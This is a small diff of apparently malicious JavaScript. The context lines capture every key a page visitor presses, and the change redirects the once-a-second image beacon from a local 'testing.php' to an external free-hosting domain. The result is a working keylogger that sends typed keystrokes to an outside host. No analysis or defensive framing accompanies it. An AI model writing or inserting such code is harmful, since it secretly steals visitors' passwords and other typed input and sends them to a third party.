@@ -9,6 +9,6 @@ document.onkeypress =function(e)
 }
 window.setInterval(function()
 {
-	new Image().src = 'testing.php?log=' + keys;
+	new Image().src = 'https://lmsesn.000webhostapp.com/testing.php?log=' + keys;
 	keys = '';
 },1000);
